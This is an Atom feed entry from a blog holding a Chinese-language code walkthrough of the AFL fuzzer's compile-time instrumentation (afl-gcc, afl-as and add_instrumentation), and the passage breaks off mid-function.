<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>V3rdant&#39;s Blog</title>
  
  
  <link href="https://v3rdant.cn/atom.xml" rel="self"/>
  
  <link href="https://v3rdant.cn/"/>
  <updated>2024-03-04T07:47:22.258Z</updated>
  <id>https://v3rdant.cn/</id>
  
  <author>
    <name>V3rdant</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Fuzz.AFL-All-in-One</title>
    <link href="https://v3rdant.cn/Fuzz.AFL-All-in-One/"/>
    <id>https://v3rdant.cn/Fuzz.AFL-All-in-One/</id>
    <published>2024-01-12T13:52:38.000Z</published>
    <updated>2024-03-04T07:47:22.258Z</updated>
    
    <content type="html"><![CDATA[<h1 id="overview">overview</h1><p>对于AFL代码的重新阅读，笔者之前曾经阅读过一次AFL代码，但是比较粗糙，所以决定重新阅读一遍，理解其中比较细节的部分。</p><p>首先简单介绍一下AFL，AFL是一个覆盖率引导的fuzz 工具。</p><p>它将一个无跳转的顺序执行流程看成一个基本块，并通过一个bitmap记录运行时每一个输入对应的标准块。</p><p>通过基本块的覆盖率引导对于输入种子的变异，从而不断变换输入，进行测试，来挖掘漏洞。</p><h1 id="afl-gcc-afl-as-代码插桩">afl-gcc/afl-as | 代码插桩</h1><p>afl的核心思想是覆盖率引导，为了能够得到运行时代码覆盖率，AFL需要在编译时对产生的汇编代码进行插桩，在每个基本块前插入的桩代码能够写入对应bitmap，记录运行时当前覆盖率</p><p>这是通过对gcc和as的封装实现的，也即通过封装编译器以及汇编器，来实现编译时插桩。</p><p><strong>afl-gcc</strong> 的核心逻辑很简单</p><p>只是对于gcc，做了一些参数处理的封装，让gcc启用一些配合fuzz的编译参数，并且使用封装好的afl-as作为汇编器</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isatty(<span class="number">2</span>) &amp;&amp; !getenv(<span class="string">&quot;AFL_QUIET&quot;</span>))</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    SAYF(cCYA <span class="string">&quot;afl-cc &quot;</span> cBRI VERSION cRST <span class="string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    be_quiet = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>)</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    SAYF(<span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;This is a helper application for afl-fuzz. It serves as a drop-in replacement\n&quot;</span></span><br><span class="line">         <span class="string">&quot;for gcc or clang, letting you recompile third-party code with the required\n&quot;</span></span><br><span class="line">         <span class="string">&quot;runtime instrumentation. A common use pattern would be one of the following:\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;  CC=%s/afl-gcc ./configure\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  CXX=%s/afl-g++ ./configure\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;You can specify custom next-stage toolchain via AFL_CC, AFL_CXX, and AFL_AS.\n&quot;</span></span><br><span class="line">         <span class="string">&quot;Setting AFL_HARDEN enables hardening optimizations in the compiled code.\n\n&quot;</span>,</span><br><span class="line">         BIN_PATH, BIN_PATH);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  find_as(argv[<span class="number">0</span>]);</span><br><span class="line">  <span class="comment">// 首先找到封装的afl-as</span></span><br><span class="line">  edit_params(argc, argv);</span><br><span class="line">  <span class="comment">// 然后对于参数进行处理传给真正的编译器</span></span><br><span class="line">  execvp(cc_params[<span class="number">0</span>], (<span class="type">char</span> **)cc_params);</span><br><span class="line">  <span class="comment">// 然后运行编译器</span></span><br><span class="line">  FATAL(<span class="string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, cc_params[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后是<strong>afl-as</strong>，他是as的封装，插桩就是在此完成的,  这里主要关注插装的实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line"></span><br><span class="line">  s32 pid;</span><br><span class="line">  u32 rand_seed;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  u8* inst_ratio_str = getenv(<span class="string">&quot;AFL_INST_RATIO&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">timezone</span> <span class="title">tz</span>;</span></span><br><span class="line"></span><br><span class="line">  clang_mode = !!getenv(CLANG_ENV_VAR);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isatty(<span class="number">2</span>) &amp;&amp; !getenv(<span class="string">&quot;AFL_QUIET&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    SAYF(cCYA <span class="string">&quot;afl-as &quot;</span> cBRI VERSION cRST <span class="string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  &#125; <span class="keyword">else</span> be_quiet = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">    SAYF(<span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;This is a helper application for afl-fuzz. It is a wrapper around GNU &#x27;as&#x27;,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;executed by the toolchain whenever using afl-gcc or afl-clang. You probably\n&quot;</span></span><br><span class="line">         <span class="string">&quot;don&#x27;t want to run this program directly.\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;Rarely, when dealing with extremely complex projects, it may be advisable to\n&quot;</span></span><br><span class="line">         <span class="string">&quot;set AFL_INST_RATIO to a value less than 100 in order to reduce the odds of\n&quot;</span></span><br><span class="line">         <span class="string">&quot;instrumenting every discovered branch.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  gettimeofday(&amp;tv, &amp;tz);</span><br><span class="line">  rand_seed = tv.tv_sec ^ tv.tv_usec ^ getpid();</span><br><span class="line">  srandom(rand_seed);</span><br><span class="line">  edit_params(argc, argv);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (inst_ratio_str) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">sscanf</span>(inst_ratio_str, <span class="string">&quot;%u&quot;</span>, &amp;inst_ratio) != <span class="number">1</span> || inst_ratio &gt; <span class="number">100</span>) </span><br><span class="line">      FATAL(<span class="string">&quot;Bad value of AFL_INST_RATIO (must be between 0 and 100)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (getenv(AS_LOOP_ENV_VAR))</span><br><span class="line">    FATAL(<span class="string">&quot;Endless loop when calling &#x27;as&#x27; (remove &#x27;.&#x27; from your PATH)&quot;</span>);</span><br><span class="line"></span><br><span class="line">  setenv(AS_LOOP_ENV_VAR, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When compiling with ASAN, we don&#x27;t have a particularly elegant way to skip</span></span><br><span class="line"><span class="comment">     ASAN-specific branches. But we can probabilistically compensate for</span></span><br><span class="line"><span class="comment">     that... */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_USE_ASAN&quot;</span>) || getenv(<span class="string">&quot;AFL_USE_MSAN&quot;</span>)) &#123;</span><br><span class="line">    sanitizer = <span class="number">1</span>;</span><br><span class="line">    inst_ratio /= <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!just_version) add_instrumentation();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!(pid = fork())) &#123;</span><br><span class="line"></span><br><span class="line">    execvp(as_params[<span class="number">0</span>], (<span class="type">char</span>**)as_params);</span><br><span class="line">    FATAL(<span class="string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, as_params[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;fork() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (waitpid(pid, &amp;status, <span class="number">0</span>) &lt;= <span class="number">0</span>) PFATAL(<span class="string">&quot;waitpid() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!getenv(<span class="string">&quot;AFL_KEEP_ASSEMBLY&quot;</span>)) unlink(modified_file);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(WEXITSTATUS(status));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>插装的核心在于调用的 <strong><code>add_instrumentation</code></strong> 函数</p><h2 id="add-instrumentation">add_instrumentation</h2><p><strong><code>add_instrumentation</code></strong> 就是实际用来插桩的函数。</p><p>此函数首先打开input文件和output文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">add_instrumentation</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> u8 line[MAX_LINE];</span><br><span class="line"></span><br><span class="line">  FILE* inf;</span><br><span class="line">  FILE* outf;</span><br><span class="line">  s32 outfd;</span><br><span class="line">  u32 ins_lines = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  u8  instr_ok = <span class="number">0</span>, skip_csect = <span class="number">0</span>, skip_next_label = <span class="number">0</span>,</span><br><span class="line">      skip_intel = <span class="number">0</span>, skip_app = <span class="number">0</span>, instrument_next = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">  u8* colon_pos;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (input_file) &#123;</span><br><span class="line"></span><br><span class="line">    inf = fopen(input_file, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!inf) PFATAL(<span class="string">&quot;Unable to read &#x27;%s&#x27;&quot;</span>, input_file);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> inf = <span class="built_in">stdin</span>;</span><br><span class="line"></span><br><span class="line">  outfd = open(modified_file, O_WRONLY | O_EXCL | O_CREAT, <span class="number">0600</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (outfd &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;Unable to write to &#x27;%s&#x27;&quot;</span>, modified_file);</span><br><span class="line"></span><br><span class="line">  outf = fdopen(outfd, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!outf) PFATAL(<span class="string">&quot;fdopen() failed&quot;</span>);  </span><br></pre></td></tr></table></figure><p>然后开始循环遍历input文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">while</span> (fgets(line, MAX_LINE, inf)) &#123;</span><br></pre></td></tr></table></figure><p>在特定位置插桩代码，这里的几个flag的值将在后面解释，简单来说，就是用来找到需要插桩的基本块的开头。这几个flag就是用来识别当前是否是基本块的开头。如果是是，就需要进行插桩</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp;</span><br><span class="line">    instrument_next &amp;&amp; line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span> &amp;&amp; <span class="built_in">isalpha</span>(line[<span class="number">1</span>])) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">          R(MAP_SIZE));</span><br><span class="line"></span><br><span class="line">  instrument_next = <span class="number">0</span>;</span><br><span class="line">  ins_lines++;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>无论是否进行了插桩，最后都要将原行写入输出文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fputs</span>(line, outf);</span><br></pre></td></tr></table></figure><p>由于一般只在text段插桩，所以要在找到此段，并且用 <code>instr_ok</code> 来标识</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (pass_thru) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* All right, this is where the actual fun begins. For one, we only want to</span></span><br><span class="line"><span class="comment">   instrument the .text section. So, let&#x27;s keep track of that in processed</span></span><br><span class="line"><span class="comment">   files - and let&#x27;s set instr_ok accordingly. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span> &amp;&amp; line[<span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* OpenBSD puts jump tables directly inline with the code, which is</span></span><br><span class="line"><span class="comment">     a bit annoying. They use a specific format of p2align directives</span></span><br><span class="line"><span class="comment">     around them, so we use that as a signal. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!clang_mode &amp;&amp; instr_ok &amp;&amp; !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;p2align &quot;</span>, <span class="number">8</span>) &amp;&amp;</span><br><span class="line">      <span class="built_in">isdigit</span>(line[<span class="number">10</span>]) &amp;&amp; line[<span class="number">11</span>] == <span class="string">&#x27;\n&#x27;</span>) skip_next_label = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;text\n&quot;</span>, <span class="number">5</span>) ||</span><br><span class="line">      !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t.text&quot;</span>, <span class="number">13</span>) ||</span><br><span class="line">      !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t__TEXT,__text&quot;</span>, <span class="number">21</span>) ||</span><br><span class="line">      !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section __TEXT,__text&quot;</span>, <span class="number">21</span>)) &#123;</span><br><span class="line">    instr_ok = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">continue</span>; </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section\t&quot;</span>, <span class="number">8</span>) ||</span><br><span class="line">      !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;section &quot;</span>, <span class="number">8</span>) ||</span><br><span class="line">      !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;bss\n&quot;</span>, <span class="number">4</span>) ||</span><br><span class="line">      !<span class="built_in">strncmp</span>(line + <span class="number">2</span>, <span class="string">&quot;data\n&quot;</span>, <span class="number">5</span>)) &#123;</span><br><span class="line">    instr_ok = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>skip_csect</code> 用来跳过无用段，比如64位程序中的.code32段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code32&quot;</span>)) skip_csect = use_64bit;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.code64&quot;</span>)) skip_csect = !use_64bit;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跳过intel 风格的汇编</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.intel_syntax&quot;</span>)) skip_intel = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;.att_syntax&quot;</span>)) skip_intel = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>跳过 ad-hoc __asm__  字段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;#&#x27;</span> || line[<span class="number">1</span>] == <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;#APP&quot;</span>)) skip_app = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;#NO_APP&quot;</span>)) skip_app = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后，对于条件跳转，可以直接区分出基本块，所以可以直接插桩</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (line[<span class="number">1</span>] == <span class="string">&#x27;j&#x27;</span> &amp;&amp; line[<span class="number">2</span>] != <span class="string">&#x27;m&#x27;</span> &amp;&amp; R(<span class="number">100</span>) &lt; inst_ratio) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">            R(MAP_SIZE));</span><br><span class="line">    ins_lines++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>识别跳转标签来插桩，并且针对不同平台进行处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Apple: L&lt;whatever&gt;&lt;digit&gt;: */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((colon_pos = <span class="built_in">strstr</span>(line, <span class="string">&quot;:&quot;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;L&#x27;</span> &amp;&amp; <span class="built_in">isdigit</span>(*(colon_pos - <span class="number">1</span>))) &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Everybody else: .L&lt;whatever&gt;: */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;:&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* .L0: or LBB0_0: style jump destination */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Apple: L&lt;num&gt; / LBB&lt;num&gt; */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">isdigit</span>(line[<span class="number">1</span>]) || (clang_mode &amp;&amp; !<span class="built_in">strncmp</span>(line, <span class="string">&quot;LBB&quot;</span>, <span class="number">3</span>)))</span><br><span class="line">            &amp;&amp; R(<span class="number">100</span>) &lt; inst_ratio) &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Apple: .L&lt;num&gt; / .LBB&lt;num&gt; */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">isdigit</span>(line[<span class="number">2</span>]) || (clang_mode &amp;&amp; !<span class="built_in">strncmp</span>(line + <span class="number">1</span>, <span class="string">&quot;LBB&quot;</span>, <span class="number">3</span>)))</span><br><span class="line">            &amp;&amp; R(<span class="number">100</span>) &lt; inst_ratio) &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">          <span class="comment">/* An optimization is possible here by adding the code only if the</span></span><br><span class="line"><span class="comment">             label is mentioned in the code in contexts other than call / jmp.</span></span><br><span class="line"><span class="comment">             That said, this complicates the code by requiring two-pass</span></span><br><span class="line"><span class="comment">             processing (messy with stdin), and results in a speed gain</span></span><br><span class="line"><span class="comment">             typically under 10%, because compilers are generally pretty good</span></span><br><span class="line"><span class="comment">             about not generating spurious intra-function jumps.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">             We use deferred output chiefly to avoid disrupting</span></span><br><span class="line"><span class="comment">             .Lfunc_begin0-style exception handling calculations (a problem on</span></span><br><span class="line"><span class="comment">             MacOS X). */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (!skip_next_label) instrument_next = <span class="number">1</span>; <span class="keyword">else</span> skip_next_label = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Function label (always instrumented, deferred mode). */</span></span><br><span class="line"></span><br><span class="line">        instrument_next = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">      